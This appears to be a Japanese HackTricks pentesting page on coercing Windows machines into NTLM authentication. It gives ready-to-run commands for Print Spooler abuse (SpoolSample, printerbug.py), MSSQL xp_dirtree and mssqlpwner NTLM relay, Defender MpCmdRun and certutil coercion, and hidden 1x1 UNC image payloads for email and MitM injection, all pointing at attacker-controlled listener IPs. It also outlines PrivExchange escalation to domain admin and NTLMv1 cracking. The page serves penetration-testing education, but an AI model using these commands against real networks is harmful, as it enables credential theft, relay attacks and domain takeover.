# NTLM特権認証の強制

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。

## スプーラーサービスの悪用

_**Print Spooler**_ サービスが**有効**になっている場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
プリンターが任意のシステムに通知を送信する際には、その**システム**に対して**認証**を行う必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピュータアカウント**が使用されます。

### ドメイン上のWindowsサーバーの発見

PowerShellを使用してWindowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### スプーラーサービスのリスニングを確認する

少し修正された@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を使用して、スプーラーサービスがリスニングしているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 任意のホストに対してサービスに認証を要求する

[ **ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用してください。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegationとの組み合わせ

攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を持つコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者はすでにこのホストを侵害しているため、**このチケットを取得**して悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。

## RCP強制認証

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。

デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するWriteDacl特権を持っています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継して認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。

## Windows内部

すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、この別の技術を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### メール経由

もしあなたが侵害したいマシンにログインするユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送信することができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして、彼がそれを開くと、認証を試みるでしょう。

### MitM

もしあなたがコンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できるなら、次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM認証を強制し、フィッシングする他の方法

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1のクラッキング

[NTLMv1チャレンジをキャプチャできる場合、こちらを読んでそれらをクラッキングする方法](../ntlm/index.html#ntlmv1-attack)。\
_ NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_

{{#include ../../banners/hacktricks-training.md}}
